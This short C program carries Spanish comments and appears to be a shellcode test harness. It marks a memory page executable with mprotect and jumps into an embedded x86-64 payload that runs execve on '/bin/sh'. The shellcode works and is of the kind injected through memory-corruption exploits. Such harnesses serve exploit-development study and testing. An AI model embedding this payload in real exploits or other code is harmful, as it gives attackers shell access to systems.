#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

unsigned char shellcode[] = "\x48\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05";

int main() {
    printf("Ejecutando shellcode...\n");

    // Obtener el tamaño de la página de memoria
    size_t pagesize = sysconf(_SC_PAGESIZE);
    void *shellcode_page = (void *)((size_t)shellcode & ~(pagesize - 1));

    // Cambiar permisos de memoria a ejecutable
    if (mprotect(shellcode_page, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC) != 0) {
        perror("mprotect");
        return 1;
    }

    // Ejecutar shellcode
    void (*ret)() = (void(*)())shellcode;
    ret();

    return 0;
}
